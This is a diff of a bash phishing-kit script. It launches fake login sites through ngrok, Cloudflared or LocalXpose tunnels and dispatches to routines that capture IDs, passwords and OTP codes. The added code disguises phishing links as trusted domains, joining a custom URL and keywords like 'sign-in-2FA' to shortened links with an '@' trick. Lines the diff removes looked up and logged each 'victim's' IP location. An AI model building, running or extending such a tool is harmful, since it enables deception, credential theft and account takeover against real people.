@@ -10,7 +10,7 @@ MAGENTA="$(printf '\033[35m')"
 CYAN="$(printf '\033[36m')"
 WHITE="$(printf '\033[37m')"
 BLACK="$(printf '\033[30m')"
-NC='\033[0m' #Reset colour
+NC="$(printf '\033[0m')" #Reset colour
 #Background
 REDBG="$(printf '\033[41m')"
 GREENBG="$(printf '\033[42m')"
@@ -23,12 +23,9 @@ BLACKBG="$(printf '\033[40m')"
 RESETBG="$(printf '\e[0m\n')" #Reset background
 
 #Directories
-pro_dir=$(pwd)
-server_dir="${pro_dir}/.server"
-sites_dir="${pro_dir}/.sites"
-
-#Variables
-LINK="INVALID"
+#Directories
+pro_dir=$(pwd) #project directory
+server_dir="${pro_dir}/.server" #server directory
 log_name=$(date +%d-%m-%Y-%H-%M-%S)
 
 #Normal Banner
@@ -241,163 +238,124 @@ update() {
 
 }
 
-## URL MASKING
-MASKING() { #4 last one using url shortner apis
-	RESPONSE=$(wget -nv --spider https://is.gd 2>&1 | awk '{print $5}')
-	#getting response from is.gd
-	if [[ ${RESPONSE} == "200" ]];then
-		SITE=$(curl -s https://is.gd/create.php\?format\=simple\&url=${LINK})
-		if [[ ${SITE} == https://is.gd/[-0-9a-zA-Z]* ]]; then #RE-CHECKING For a valid url somtimes site goes down!!
-			MASK_SUFfix=${SITE#https://}
-		else #as a backup shortner
-			SITE=$(curl -s https://api.shrtco.de/v2/shorten?url=${LINK} >> site.log)
-			grep -o 'https:[^"]*' site.log >> bURI;rm log.URI;sed 's/\\//g' bURI >> .uri.log;rm bURI
-			MASK_SUFfix=$(grep -o '9qr.de/[-0-9a-zA-Z]*' ".uri.log")
-		fi
-	else
-		echo "${GREEN}[${WHITE}!${GREEN}]${GREEN}Error occured while masking try again"
-		sleep 5
-		cusurl
-	fi
-	{ clear; sbanner; }
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL : ${GREEN}${LINK}"
-	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${ORANGE} MASKED URL : ${GREEN}${CUS_URL}-${Keystks}@${MASK_SUFfix}${GREEN}"
-}
-
-checkurl() { #3 checking for HTTP|S or WWW input type is valid or not.
-	if [[ ! "${1//:*}" =~ ^([h][t][t][p]|[h][t][t][p][s])$ ]]; then
-		if [[  "${1::3}" != 'www' ]]; then
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error [105] : Invalid URL | USE www/http or https insted of : ${CUS_URL}"
-			{ sleep 1.5; clear; banner; cusurl; }
-		fi
-	fi
-}
-
-cusurl(){
-	echo " "
-	echo -ne "${RED}[${WHITE}-${RED}]${ORANGE} Do You want to Customize the uRL BeLow?"
-	echo " "
-	read -p "${RED}[${WHITE}?${RED}]${ORANGE} $LINK (Y/n):${ORANGE}" CUS_URI
-	case $CUS_URI in
-                Y | y)
-			read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN}Enter Your Custom uRL (eg:https://google.com | www.google.com):" CUS_URL
-                	checkurl ${CUS_URL}
-        	        echo " "
-	                read -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Some KeyStocks (${WHITE}eg: sign-in-2FA ${ORANGE})${GREEN} : ${ORANGE}" Keystks
-                	if [[ ${Keystks} =~ ^([0-9a-zA-Z-]*)$ ]]; then
-	                        MASKING
-        	        else
-                        	echo -ne "\n\a\a${RED}[${WHITE}!${RED}]${RED} Error [105] : Invalid Input : ${Keystks}"
-                	        { sleep 1.5; clear; banner; cusurl; }
-        	        fi;;
-                N | n | *)
-                        { clear; sbanner; }
-	                echo " "
-                	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL : ${GREEN}${LINK}"
-        	        echo " ";;
-		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Try again!!!\a\a"
-	                { clear; banner; cusurl; }
-                esac
-}
-checklink() {
-	if [ ${LINK}=="" ]; then
-		clear
-		banner
-		echo " "
-		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error in generating the link"
-		echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Starting localhost. You might need to start tunneler manually"
-		sleep 6
-		start_localhost
-	else
-		cusurl
-	fi
-}
-
 ## Install ngrok
 check_ngrok(){
 	if [ ! -e ".server/ngrok" ]; then
+		echo " "
 		read -p "${GREEN}[${WHITE}?${GREEN}]${GREEN} Ngrok Not installed do you want to install ngrok now? (Y/n) : ${BLUE}"
 		case $REPLY in
 		Y | y)
 			install_ngrok
-			start_ngrok;;
+			ngrok_token_check;;
+
 		N | n | *)
 			tunnelmenu;;
+
 		esac
 	else
-		start_ngrok
+		ngrok_token_check
 	fi
 }
 install_ngrok() {
-	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
-	arch=`uname -m`
-	if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-		download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
-	elif [[ "$arch" == *'aarch64'* ]]; then
-		download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz' 'ngrok'
-	elif [[ "$arch" == *'x86_64'* ]]; then
-		download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz' 'ngrok'
-	else
-		download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz' 'ngrok'
-	fi
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz' 'ngrok'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz' 'ngrok'
+		else
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz' 'ngrok'
+		fi
 }
-
 ##Ngrok token auth
 ngrok_token_check(){
         if [ -s "${HOME}/.ngrok2/ngrok.yml" ]; then
                 echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Ngrok Authtoken setup is already done."
+		start_ngrok
         else
-                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Setting up authtoken"
+                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${BLUE} Setting up authtoken"
                 ngrok_token_setup
         fi
 }
-
 ngrok_token_setup(){
         if [[ -d "${HOME}/.ngrok2/" ]]; then
-               echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Ngrok2 directory exists!!"
+		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Ngrok2 directory exists!!"
         else
-               mkdir $HOME/.ngrok2
-               echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Created Ngrok2 directory "
+		mkdir $HOME/.ngrok2
+		echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Created Ngrok2 directory "
+		echo " "
         fi
 
-        if [[ -s "${HOME}/.ngrok2/ngrok.yml" ]]; then
-               rm -rf ${HOME}/.ngrok2/ngrok.yml
-	       echo -e "\n"
-               read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter your authtoken :" ntoken
-               authline="authtoken : ${ntoken}"
-               echo "$authline" >> ngrok.yml
-               mv ngrok.yml ${HOME}/.ngrok2/
-        else
-               read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter your authtoken :" ntoken
-               echo "authtoken : ${ntoken}" >> ngrok.yml
-               mv ngrok.yml ${HOME}/.ngrok2/
-        fi
+	rm -rf ${HOME}/.ngrok2/ngrok.yml
+	read -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter your authtoken :" ntoken
+	echo "authtoken : ${ntoken}" >> ngrok.yml
+	mv ngrok.yml ${HOME}/.ngrok2/
+	./.server/ngrok config upgrade
+	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Upgraded ngrok configurations"
+	clear
+	banner
 	start_ngrok
 }
-
+ngrok_region() {
+        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter prefered region (Default=us) : "
+	read -p "${GREEN}   (Example: us eu au ap sa jp in) : " ngrokregion
+	case $ngrokregion in
+	"us" | "US")
+		ngrokregion="us";;
+	"eu" | "EU")
+		ngrokregion="eu";;
+	"au" | "AU")
+		ngrokregion="au";;
+	"ap" | "AP")
+		ngrokregion="ap";;
+	"sa" | "SA")
+		ngrokregion="sa";;
+	"jp" | "JP")
+		ngrokregion="jp";;
+	"in" | "IN")
+		ngrokregion="in";;
+	*)
+		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Tryagain"
+		sleep 5
+		clear
+		banner
+		ngrok_region;;
+	esac
+}
 ## Start ngrok
 start_ngrok() {
         echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST ${GREEN})"
         { sleep 1; setup_site; }
-        echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
-        ngrok_token_check
+	echo -e "\n"
+	ngrokregion="us"
+        read -p "${RED}[${WHITE}-${RED}]${GREEN} Change Ngrok Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] : ${ORANGE} " reply
+	case $reply in
+	Y | y)
+		ngrok_region;;
+	N | n | *)
+		echo " ";;
+	esac
+        echo -ne "${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
     if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
+        sleep 2 && termux-chroot ./.server/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
     else
-        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
+        sleep 2 && ./.server/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
     fi
-
-        { sleep 8; clear; banner; }
-        ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
-	LINK="${ngrok_url}"
+	sleep 15
+	fetchlink_ngrok
 	checklink
-        capture_data_check
+}
+fetchlink_ngrok() {
+	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
+        LINK="$ngrok_url"
 }
 
 ## Install Cloudflared
 check_cloudflared(){
 	if [ ! -e ".server/cloudflared" ]; then
+		echo " "
 		read -p "${GREEN}[${WHITE}?${GREEN}]${GREEN} Cloudflared Not installed do you want to install Cloudflared now? (Y/n) : ${BLUE}"
 		case $REPLY in
 		Y | y)
@@ -407,27 +365,26 @@ check_cloudflared(){
 			tunnelmenu;;
 		esac
 	else
-		start_cloudflared
+                start_cloudflared
 	fi
 }
 install_cloudflared() {
-	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
-	arch=`uname -m`
-	if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-		download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
-	elif [[ "$arch" == *'aarch64'* ]]; then
-		download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
-	elif [[ "$arch" == *'x86_64'* ]]; then
-		download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
-	else
-		download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
-	fi
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
+		else
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
+		fi
 }
-
 ## Start Cloudflared
 start_cloudflared() {
         rm .cld.log > /dev/null 2>&1 &
-        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST ${GREEN})"
         { sleep 1; setup_site; }
         echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
@@ -436,23 +393,26 @@ start_cloudflared() {
     else
         sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
     fi
-
-        { sleep 8; clear; banner; }
-
-        cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
-	LINK="${cldflr_link}"
+	sleep 15
+	fetchlink_cloudflared
 	checklink
-        capture_data_check
+}
+fetchlink_cloudflared() {
+	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
+        LINK="${cldflr_url}"
 }
 
 ## Install LocalXpose
 check_localxpose(){
 	if [ ! -e ".server/loclx" ]; then
+		echo " "
 		read -p "${GREEN}[${WHITE}?${GREEN}]${GREEN} Localxpose Not installed do you want to install localxpose now? (Y/n) : ${BLUE}"
 		case $REPLY in
 		Y | y)
 			install_localxpose
+			token_localxpose
 			start_loclx;;
+
 		N | n | *)
 			tunnelmenu;;
 
@@ -462,19 +422,18 @@ check_localxpose(){
 	fi
 }
 install_localxpose() {
-	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
-	arch=`uname -m`
-	if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-		download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
-	elif [[ "$arch" == *'aarch64'* ]]; then
-		download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
-	elif [[ "$arch" == *'x86_64'* ]]; then
-		download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
-	else
-		download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
-	fi
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
+		else
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
+		fi
 }
-
 token_localxpose() {
 	./.server/loclx -help > /dev/null 2>&1 &
 	sleep 1
@@ -491,13 +450,12 @@ token_localxpose() {
 		}
 	}
 }
-
 ## Start LocalXpose
 start_loclx() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-	{ sleep 1; setup_site; token_localxpose; }
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST ${GREEN})"
+	{ sleep 1; setup_site; }
 	echo -e "\n"
-	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] : ${ORANGE} " opinion
 	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
 	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
 
@@ -506,12 +464,13 @@ start_loclx() {
 	else
 		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
 	fi
-
-	{ sleep 12; clear; banner; }
-	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io') #DONE :)
-	LINK="${loclx_url}"
+	sleep 15
+	fetchlink_localxpose
 	checklink
-	capture_data_check
+}
+fetchlink_localxpose() {
+	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io')
+        LINK="${loclx_url}"
 }
 
 # Download Binaries
@@ -545,11 +504,11 @@ download() {
 
 ## Start localhost
 start_localhost() {
-        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST ${GREEN})"
         setup_site
         { sleep 1; clear; banner; }
-        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
-        capture_data_check
+        displaylocalhost
+	capture_data_check
 }
 
 #Host and port setup
@@ -570,6 +529,7 @@ cusport() {
 	esac
 }
 
+##Setup website and start php server
 setup_site() {
 	exit_internet
 	rm -rf $zipname
@@ -599,140 +559,171 @@ setup_site() {
 	fi
 }
 
-## Get IP address
-capture_ip() {
-        IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
-        IFS=$'\n'
-        echo -e "\n${RED} Victim's IP : ${RED}$IP"
-	if [ reply_tunnel=1 ]; then
-		echo -ne "${RED} IP details cannot be captured in localhost server"
+#Check whether link was generated properly
+checklink() {
+	if [ -z "$LINK" ]; then
+		clear
+		banner
 		echo " "
-		save_ip
-		rm -rf .server/www/ip.txt
-	elif [ reply_tunnel=01 ]; then
-		echo -ne "${RED} IP details cannot be captured in localhost server"
-		echo " "
-		save_ip
-		rm -rf .server/www/ip.txt
+		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error in generating the link"
+		echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Starting localhost. You might need to start tunneler manually"
+		sleep 5
+		start_localhost
 	else
-	ip_details
-	save_ip
+		cusurl
 	fi
 }
-save_ip() {
-cat .server/dumps/space.txt >> ${log_name}.txt
-cat .server/dumps/line.txt >> ${log_name}.txt
-cat .server/www/ip.txt >> ${log_name}.txt
-mv ${log_name}.txt logs
-echo -ne "\n${BLUE} IP Details Saved in : ${GREEN} /logs/${log_name}.txt"
-}
-ip_details() {
-	IFS='\n'
-	iptracker=$(curl -s -L "http://ipwhois.app/json/$IP" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > location.txt &&  grep -o '"[^"]*"\s*:\s*"[^"]*"' location.txt > "${pro_dir}/track.txt")
-	IFS=$'\n'
-	iptt=$(sed -n 's/"ip"://p' "${pro_dir}/track.txt")
 
-	if [[ $iptt != "" ]]; then
-		echo -e  "\n${GREEN} Device ip: ${NC} $iptt"
+## URL MASKING
+cusurl(){
+	clear
+	banner
+	echo " "
+	echo -ne "${RED}[${WHITE}-${RED}]${GREEN} Do You want to Customize the uRL BeLow?"
+	echo " "
+	read -p "${RED}[${WHITE}-${RED}]${ORANGE} $LINK (Y/n) : ${ORANGE}" CUS_URI
+	case $CUS_URI in
+                Y | y)
+			check_netstats
+			if [ $netstats=="Online" ]; then
+				shorten_keystocks
+			else
+				{ clear; sbanner; }
+				echo "${RED}Your offline, Cannot shorten link. Proceeding without shortening link"
+				sleep 5
+				displaylink
+				capture_data_check
+			fi;;
+                N | n )
+			displaylink
+			capture_data_check;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Try again!!!\a\a"
+	                { clear; banner; cusurl; }
+                esac
+}
+shorten_keystocks(){
+	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN}Enter Your Custom uRL (eg:https://google.com | www.google.com) : " CUS_URL
+	checkurl ${CUS_URL}
+	echo " "
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter Some KeyStocks (${WHITE}eg: sign-in-2FA ${ORANGE})${GREEN} : ${ORANGE}" Keystks #KEY_STOCKS
+	if [[ ${Keystks} =~ ^([0-9a-zA-Z-]*)$ ]]; then
+		shorten
+	else
+		echo -ne "\n\a\a${RED}[${WHITE}!${RED}]${RED} Error [105] : Invalid Input : ${Keystks}"
+		{ sleep 1.5; clear; banner; cusurl; }
 	fi
-	iptype=$(sed -n 's/"type"://p' "${pro_dir}/track.txt")
-	if [[ $iptype != "" ]]; then
-		echo -e "\n${GREEN} IP type: ${NC} $iptype"
+}
+checkurl() { #3 checking for HTTP|S or WWW input type is valid or not.
+	if [[ ! "${1//:*}" =~ ^([h][t][t][p]|[h][t][t][p][s])$ ]]; then
+		if [[  "${1::3}" != 'www' ]]; then
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error [105] : Invalid URL | USE www/http or https insted of : ${CUS_URL}"
+			{ sleep 1.5; clear; banner; cusurl; }
+		fi
 	fi
-	latitude=$(sed -n 's/"latitude"://p' "${pro_dir}/track.txt")
-	if [[ $latitude != "" ]]; then
-		echo -e  "\n${GREEN} Latitude:  ${NC} $latitude"
+}
+check_site() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
+shorten() {
+	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} SHORTENING URL : ${YELLOW} ${LINK}"
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Shortening maytake some time (approx 30 seconds)"
+	isgd="https://is.gd/create.php?format=simple&url="
+	shortcode="https://api.shrtco.de/v2/shorten?url="
+	tinyurl="https://tinyurl.com/api-create.php?url="
+	if [[ $(check_site $isgd) == 2* ]]; then
+		shorten_isgd $isgd "$LINK"
+	else
+		final_isgd_url="${ORANGE} Couldn't shorten this link here"
+                masked_isgd_url="${ORANGE} Couldn't mask this link here"
 	fi
-	longitude=$(sed -n 's/"longitude"://p' "${pro_dir}/track.txt")
-	if [[ $longitude != "" ]]; then
-		echo -e  "\n${GREEN} Longitude:  ${NC} $longitude"
+	if [[ $(check_site $shortcode) == 2* ]]; then
+		shorten_shortcode $shortcode "$LINK"
+	else
+		final_shortcode_url1="${ORANGE} Couldn't shorten this link here"
+                masked_shortcode_url1="${ORANGE} Couldn't mask this link here"
+		final_shortcode_url2="${ORANGE} Couldn't shorten this link here"
+                masked_shortcode_url2="${ORANGE} Couldn't mask this link here"
+		final_shortcode_url3="${ORANGE} Couldn't shorten this link here"
+                masked_shortcode_url3="${ORANGE} Couldn't mask this link here"
 	fi
-	city=$(sed -n 's/"city"://p' "${pro_dir}/track.txt")
-	if [[ $city != "" ]]; then
-		echo -e "\n${GREEN} City: ${NC} $city"
+	if [[ $(check_site $tinyurl) == 2* ]]; then
+		shorten_tinyurl $tinyurl "$LINK"
+	else
+		final_tinyurl_url="${ORANGE} Couldn't shorten this link here"
+                masked_tinyurl_url="${ORANGE} Couldn't mask this link here"
 	fi
-	isp=$(sed -n 's/"isp"://p' "${pro_dir}/track.txt")
-	if [[ $isp != "" ]]; then
-	echo -e "\n${GREEN} Isp: ${NC} $isp"
+	displayshortlink
+}
+shorten_isgd() {
+	link_isgd=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
+	processed_isgd_url=${link_isgd#http*//}
+	final_isgd_url="https://$processed_isgd_url"
+	masked_isgd_url="${CUS_URL}-${Keystks}@$processed_isgd_url"
+}
+shorten_shortcode() {
+	link_shortcode=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
+	processed_shortcode_url1=$(echo ${link_shortcode} | sed 's/\\//g' | grep -o '"short_link":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
+	final_shortcode_url1="https://$processed_shortcode_url1"
+	masked_shortcode_url1="${CUS_URL}-${Keystks}@$processed_shortcode_url1"
+	processed_shortcode_url2=$(echo ${link_shortcode} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
+	final_shortcode_url2="https://$processed_shortcode_url2"
+	masked_shortcode_url2="${CUS_URL}-${Keystks}@$processed_shortcode_url2"
+	processed_shortcode_url3=$(echo ${link_shortcode} | sed 's/\\//g' | grep -o '"short_link3":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
+	final_shortcode_url3="https://$processed_shortcode_url3"
+	masked_shortcode_url3="${CUS_URL}-${Keystks}@$processed_shortcode_url3"
+}
+shorten_tinyurl() {
+	link_tinyurl=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
+	if [ $link_tinyurl=="" ]; then
+		processed_tinyurl_url="${ORANGE} Couldn't shorten this link here"
+		final_tinyurl_url="${ORANGE} Couldn't shorten this link here"
+		masked_tinyurl_url="${ORANGE} Couldn't mask this link here"
+	else
+		processed_tinyurl_url=${link_tinyurl#http*//}
+		final_tinyurl_url="https://$processed_tinyurl_url"
+		masked_tinyurl_url="${CUS_URL}-${Keystks}@$processed_tinyurl_url"
 	fi
-	country=$(sed -n 's/"country"://p' "${pro_dir}/track.txt")
-	if [[ $country != "" ]]; then
-		echo -e  "\n${GREEN} Country: ${NC} $country"
-	fi
-	flag=$(sed -n 's/"country_flag"://p' "${pro_dir}/track.txt")
-	if [[ $flag != "" ]]; then
-		echo -e "\n${GREEN} Country flag: ${NC} $flag"
-	fi
-	cap=$(sed -n 's/"country_capital"://p' "${pro_dir}/track.txt")
-	if [[ $cap != "" ]]; then
-		echo -e "\n${GREEN} Country capital: ${NC} $cap"
-	fi
-	phon=$(sed -n 's/"country_phone"://p' "${pro_dir}/track.txt")
-	if [[ $phon != "" ]]; then
-		echo -e "\n${GREEN} Country code: ${NC} $phon"
-	fi
-	continent=$(sed -n 's/"continent"://p' "${pro_dir}/track.txt")
-	if [[ $continent != "" ]]; then
-		echo -e  "\n${GREEN} Continent:  ${NC} $continent"
-	fi
-	ccode=$(sed -n 's/"currency_code"://p' "${pro_dir}/track.txt")
-	if [[ $ccode != "" ]]; then
-		echo -e "\n${GREEN} Currency code: ${NC} $ccode"
-	fi
-	region=$(sed -n 's/"region"://p' "${pro_dir}/track.txt")
-	if [[ $region != "" ]]; then
-		echo -e "\n${GREEN} State: ${NC} $region"
-	fi
-	cat "${pro_dir}/track.txt" >> "${log_name}.txt"
-	rm -rf "${pro_dir}/track.txt"
+}
+
+## Display link
+displaylocalhost(){
+	clear
+	sbanner
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} LOCALHOST URL : ${GREEN}http://${HOST}:${PORT}"
+}
+displaylink(){
+	displaylocalhost
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} ORIGINAL URL  : ${GREEN}${LINK}"
+}
+displayshortlink() {
+	displaylink
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 1 : ${GREEN}${final_isgd_url}"
+	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  1 : ${GREEN}${masked_isgd_url}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 2 : ${GREEN}${final_shortcode_url1}"
+	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  2 : ${GREEN}${masked_shortcode_url1}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 3 : ${GREEN}${final_shortcode_url2}"
+	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  3 : ${GREEN}${masked_shortcode_url2}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 4 : ${GREEN}${final_shortcode_url3}"
+	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  4 : ${GREEN}${masked_shortcode_url3}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 5 : ${GREEN}${final_tinyurl_url}"
+	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  5 : ${GREEN}${masked_tinyurl_url}"
+	echo -e "\n${RED}[${WHITE}#${RED}]${BLUE}If above link is empty just ignore it, Use the generated link"
+	capture_data_check
 }
 
 #Capture data check
 capture_data_check(){
-	if [ -f .server/www/NOTP ];then
+	if [ -f .sites/$website/NOTP ];then
                 capture_data_1
-        elif [ -f .server/www/OOTP ];then
+        elif [ -f .sites/$website/OOTP ];then
                 capture_data_2
-        elif [ -f .server/www/POTP ];then
+        elif [ -f .sites/$website/POTP ];then
                 capture_data_3
 	else
-		echo " Error Occured in capturing data!!"
+		echo " Error Occured!!"
         fi
-
 #no 1- id pass
 # no 2 - id otp
 # no 3 - id pass otp
-}
-
-## Get credentials
